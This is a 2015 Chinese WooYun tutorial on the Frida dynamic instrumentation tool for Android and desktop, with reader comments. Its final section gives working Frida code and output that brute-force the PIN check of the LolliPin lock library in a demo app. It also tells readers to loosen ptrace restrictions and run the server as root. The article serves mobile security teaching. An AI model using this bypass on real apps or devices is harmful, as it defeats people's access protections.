@@ -1,0 +1,139 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Frida-跨平台注入工具基础篇</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">瘦蛟舞</a> <span class="bull">·</span> <time title="2015/04/14 9:15" ui-time="" datetime="2015/04/14 9:15" class="published ng-binding ng-isolate-scope">2015/04/14 9:15</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h3>0x00 功能介绍</h3><hr><p><a href="http://www.frida.re/">官方主页</a></p><p><a href="http://github.com/frida/">github</a></p><p>Inject JavaScript to explore native apps on Windows, Mac, Linux, iOS and Android.</p><ul><li>Hooking Functions</li><li>Modifying Function Arguments</li><li>Calling Functions</li><li>Sending messages from a target process</li><li>Handling runtime errors from JavaScript</li><li>Receiving messages in a target process</li><li>Blocking receives in the target process</li><li>....</li></ul><p>类似工具:Substrate/Xposed/indroid/adbi.</p><p>优势:结合python和JavaScript开发更快捷.</p><h3>0x01 Setting up your PC</h3><hr><p>python环境+<a href="https://pypi.python.org/pypi/setuptools">setuptools</a></p><pre><code>#!bash
+sudo easy_install frida 
+</code></pre><p>可选:源码编译</p><pre><code>#!bash
+$ git clone git://github.com/frida/frida.git
+$ cd frida
+$ make
+</code></pre><h4>0x02 Testing your installation</h4><hr><p>创建一个进程用于注入:</p><pre><code>#!bash
+$ cat
+</code></pre><p>新建注入脚本example.py:</p><pre><code>#!python
+import frida
+session = frida.attach("cat")
+print([x.name for x in session.enumerate_modules()])
+</code></pre><p>linux环境下需要运行如下命令:</p><pre><code>#!bash
+$ sudo sysctl kernel.yama.ptrace_scope=0
+</code></pre><p>用于开启非子进程的ptracing.</p><p>运行frida脚本,观察:</p><pre><code>#!bash
+$ python example.py
+</code></pre><p>输出结果类似如下,代码环境正常安装成功:</p><pre><code>[u'cat', …, u'ld-2.15.so']
+</code></pre><h3>0x03 Setting up your Android device</h3><hr><p>首先下载android版frida-server:</p><pre><code>#!bash
+$ curl -O http://build.frida.re/frida/android/arm/bin/frida-server
+$ chmod +x frida-server
+</code></pre><p>下一步部署到android设备上:</p><pre><code>#!bash
+$ adb push frida-server /data/local/tmp/
+</code></pre><h3>0x04 Spin up Frida</h3><hr><p>设备上运行frida-server:</p><pre><code>#!bash  
+$ adb shell 
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3f4d50504b7f5e515b4d50565b">[email&#160;protected]</a>:/ # chmod 700 frida-server  
+$ adb shell 
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="bbc9d4d4cffbdad5dfc9d4d2df">[email&#160;protected]</a>:/ # /data/local/tmp/frida-server -t 0 (注意在root下运行)
+</code></pre><p>电脑上运行adb forward tcp转发:</p><pre><code>#!bash
+adb forward tcp:27042 tcp:27042
+adb forward tcp:27043 tcp:27043
+</code></pre><p>27042端口用于与frida-server通信,之后的每个端口对应每个注入的进程.</p><p>运行如下命令验证是否成功安装:</p><pre><code>#!bash
+$ frida-ps -R
+</code></pre><p>正常情况应该输出进程列表如下:</p><pre><code>PID NAME
+ 1590 com.facebook.katana
+13194 com.facebook.katana:providers
+12326 com.facebook.orca
+13282 com.twitter.android
+…
+</code></pre><h3>0x05 Tracing open() calls in Chrome</h3><hr><p>设备上打开chrome浏览器然后在pc运行如下命令:</p><pre><code>#!bash 
+$ frida-trace -R -i open com.android.chrome 
+Uploading data... 
+open: Auto-generated handler …/linker/open.js 
+open: Auto-generated handler …/libc.so/open.js 
+Started tracing 2 functions. 
+Press ENTER to stop.
+</code></pre><p>开始使用chrome app然后会发现open()调用输出如下:</p><pre><code>1392 ms open()
+1403 ms open()
+1420 ms open()
+</code></pre><p>现在可以实时编辑的上述JS代码来调用你的Android应用</p><h3>0x06 Building your own tools</h3><hr><p>frida提供的几个工具frida-trace, frida-repl...绝逼非常有用,建议阅读Functions 和 Messages章节来了解Frida APIs,</p><p>首先,使用frida的API attach上需要注入的app</p><pre><code>#!python
+session = frida.get_remote_device().attach("com.mahh.secretsafe")
+</code></pre><p><code>session</code>对象允许你获取信息,同时也可以操作目标进程.比如,可以调用<code>enumerate_modules()</code>方法来获取进程中加载模块的host信息.</p><pre><code>#!python
+&gt;&gt;&gt; print session.enumerate_modules()
+[Module(name="app_process", base_address=0x40096000, size=8192, path="/system/bin/app_process"), Module(name="linker", base_address=0x4009a000, size=61440, path="/system/bin/linker"), Module(name="libcutils.so", base_address=0x400b0000, size=36864, path="/system/lib/libcutils.so"), Module(name="liblog.so", base_address=0x400bb000, size=12288, path="/system/lib/liblog.so"), Module(name="libc.so", base_address=0x400c0000, size=53248, path="/system/lib/libc.so"), Module(name="libstdc++.so", base_address=0x4011b000, size=4096, path="/system/lib/libstdc++.so"), Module(name="libm.so", base_address=0x4011e000, size=98304, path="/system/lib/libm.so")
+</code></pre><p>然后使用Javascript API,通过<code>session</code>的create_script()方法放入JavaScript代码块.JavaScript API可以用来插桩目标app的类.在这个API中有些针对android的例子,下面是一些简单的案例:</p><p>取得一个类的js封装:</p><pre><code>#!python
+Dalvik.perform(function () {
+    var MyClass = Dalvik.use("com.mdsec.MyClass");
+});
+</code></pre><p>如果类的构造方法有一个String对象的参数,应该用如下方式创建类的实例:</p><pre><code>#!javascript
+var MyClass = Dalvik.use("com.mdsec.MyClass");
+var MyClassInstance = MyClass.$new(“MySecretString”);
+</code></pre><p>只需要加上对应的参数就可以调用刚才新建实例的方法.例如,调用MyClass类的MyMethod方法:</p><pre><code>#!javascript
+var result = MyClassInstance.MyMethod();
+</code></pre><p>如果想替换MyMethod方法的实现来return false,使用如下代码:</p><pre><code>#!javascript
+MyClass.MyMethod.implementation = function()
+{
+            return false;
+};
+</code></pre><p>Android Context(上下文)用于获取对应app相关信息以及其运行环境.所以其被广泛用于app中,需要找一种方法来访问他.获取Android Context如下代码非常有效:</p><pre><code>#!javascript
+var currentApplication = Dalvik.use("android.app.ActivityThread").currentApplication(); 
+var context = currentApplication.getApplicationContext();
+</code></pre><p>接下来需要用到上文中提到的create_script()方法用于注册这段js代码到app session中.</p><pre><code>#!python
+script = session.create_script(jscode)
+</code></pre><p>为了接收从Python session中JavaScript代码返回的数据,还需要注册一个message handler.注册一个message handler先要创建方法:</p><pre><code>#!python
+def on_message(message, data):
+print message
+</code></pre><p>然后通过调用<code>on()</code>方法注册event handler:</p><pre><code>#!python
+script.on('message', on_message)
+</code></pre><p>可以通过JS方法<code>send()</code>给message handler发送消息.例如,使用如下代码讲Context对象发送给Python客户端:</p><pre><code>#!python
+Dalvik.perform(function () {
+    var currentApplication = Dalvik.use("android.app.ActivityThread").currentApplication();
+    var context = currentApplication.getApplicationContext();
+    send(context);
+});
+</code></pre><p>结果会返回app的context对象的地址:</p><pre><code>{u'type': u'send', u'payload': {u'$handle': u'0x1d50079a', u'$classHandle': u'0x1d5007e6', u'$weakRef': 20}}
+</code></pre><p>现在已经掌握frida的基础知识,现在可以实战演练如何破解<a href="https://github.com/OrangeGangsters/LolliPin">LolliPin</a>锁屏库.我们创建一个使用<code>LolliPin</code>的app截图如下:</p><p><img alt="" img-src="f38f712d735da3c95c623c6cddac97497aed5f21.jpg"></p><p>PIN码生效后,可以使用插桩暴力破击.要达到这个目的首先要了解pin码验证是如何实现的.AppLockImpl类中验证方法如下:</p><p><img alt="" img-src="684a825f777e21038c8980b8a6c42eb765678651.jpg"></p><p>现在咱们忽略LolliPin的其他漏洞,就搞PIN码的暴露破解,这是客户端认证通过都会受到的分析.</p><p>可以创建一个AppLockImpl的实例,但是为了节约内存我们直接调用已有的.分析发现AppLockImpl被调用在LockManager的getAppLock()中,这个就仅仅返回了AppLock对象.而AppLock是抽象类AppLockImpl的具现.</p><p><img alt="" img-src="c9a684ab252189df346554adb7340f46fe4907e2.jpg"></p><p>LockManager有一个帮助方法用于返回自己的实例.</p><p><img alt="" img-src="828b8b1eb7d172af4b0295bdd8a37853279d7624.jpg"></p><p>结合上面的分析,咱们可以通过LockManager.getInstance()得到LockManager的实例,再调用getAppLock()得到AppLock.最后就可以调用AppLock的 checkPasscode()方法了.</p><pre><code>#!javascript
+var LockManager = Dalvik.use("com.github.orangegangsters.lollipin.lib.managers.LockManager");
+var LockManagerInstance = LockManager.getInstance();
+var AppLock = LockManagerInstance.getAppLock();
+</code></pre><p>通过for循环调用checkPasscode()来达到暴力破解的目的:</p><pre><code>#!javascript
+for(var i=1230; i&lt;1235; i++)
+{
+    var result = AppLock.checkPasscode(i+"");
+    send(i + ": " + result);
+}
+</code></pre><p>此循环将尝试1230到1235的pin码(已知PIN为1234...),最后利用空字符串将pin码连接起来做个强制转换再打印出来.运行脚本效果如下:</p><pre><code>[*] Bruteforcing PIN code
+[*] Testing PIN 1230: false
+[*] Testing PIN 1231: false
+[*] Testing PIN 1232: false
+[*] Testing PIN 1233: false
+[*] Testing PIN 1234: true
+</code></pre><p>最后完整的frida代码块如下:</p><pre><code>#!python
+# LolliPin bruteforce proof of concept
+# Author: Dominic Chell - @domchell
+
+import frida,sys
+
+def print_result(message):
+            print "[*] Testing PIN %s" %(message)
+
+def on_message(message, data):
+            print_result(message['payload'])
+
+jscode = """
+
+Dalvik.perform(function () {
+
+    var LockManager = Dalvik.use("com.github.orangegangsters.lollipin.lib.managers.LockManager");
+    var LockManagerInstance = LockManager.getInstance();
+    var AppLock = LockManagerInstance.getAppLock();
+
+    for(var i=1230; i&lt;1235; i++)
+    {
+            var result = AppLock.checkPasscode(i+"");
+        send(i + ": " + result);
+    }
+});
+"""
+
+process = frida.get_device_manager().enumerate_devices()[-1].attach("com.mahh.secretsafe")
+session = process.session
+
+script = session.create_script(jscode)
+script.on('message', on_message)
+
+print "[*] Bruteforcing PIN code"
+
+script.load()
+sys.stdin.read()
+</code></pre><h3>0x07 reference</h3><hr><p><a href="http://www.frida.re/docs/installation/">http://www.frida.re/docs/installation/</a></p><p><a href="http://www.frida.re/docs/android/">http://www.frida.re/docs/android/</a></p><p><a href="http://www.frida.re/docs/javascript-api/">http://www.frida.re/docs/javascript-api/</a></p><p><a href="http://www.frida.re/docs/functions/">http://www.frida.re/docs/functions/</a></p><p><a href="http://www.frida.re/docs/messages/">http://www.frida.re/docs/messages/</a></p><p><a href="http://blog.mdsec.co.uk/2015/04/instrumenting-android-applications-with.html">http://blog.mdsec.co.uk/2015/04/instrumenting-android-applications-with.html</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20141223141529d33ebc5e18e728db5f4a24d40002e9d1.jpg" style="width:200px;height:200px"></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瘦蛟舞</span> <span class="reply-time">2015-04-19 15:15:07</span></div><p></p><p>@Elegance 开发更简洁,如果你不写只用别人的话就没区别.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">纳米翡翠</span> <span class="reply-time">2015-04-16 14:34:05</span></div><p></p><p>哪位大神知道这是什么编码:<br>%94%D8%B7%BD%94%EC%D6%BC%BF%F5%BF%F5%94%D8%B7%BD%94%EC%95%46%CA%B1%95%42%94%FD%D6%BC%95%46%94%D8%B7%BD%94%EC%BA%B5%95%42%BF%F5%95%45%95%47%95%43%94%D8%B7%BD%94%EC%95%47%BF%F5%95%41%CA%B1%D6%BC%94%FE%94%D8%B7%BD%94%EC%B7%BD%94%E0%94%E1%EC%B6%94%DD%94%E0%94%E3%94%DD%94%E1%EC%B6%94%D8%B7%BD%94%EC%D6%BC%D4%E7%94%FD%94%DE%BA%B5%CD%FA%BF%F5%94%D8%94%E0%94%E0</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Elegance</span> <span class="reply-time">2015-04-15 09:33:34</span></div><p></p><p>跟Substrate等有啥区别或者特性？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2015-04-15 08:42:41</span></div><p></p><p>frida</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">杀戮</span> <span class="reply-time">2015-04-14 20:41:03</span></div><p></p><p>顶</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Defa</span> <span class="reply-time">2015-04-14 19:44:54</span></div><p></p><p>好厉害好厉害</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Nicky</span> <span class="reply-time">2015-04-14 13:16:41</span></div><p></p><p>几周前看到了不过当时也没深入去测试，感谢分享~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瘦蛟舞</span> <span class="reply-time">2015-04-14 10:32:29</span></div><p></p><p>http://zone.wooyun.org/content/19756 一些TIPS</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ppt</span> <span class="reply-time">2015-04-14 09:38:57</span></div><p></p><p>感谢，正好需要，不过没测试成功，我再继续看看</p><p></p></div></div></div></div></div></main>
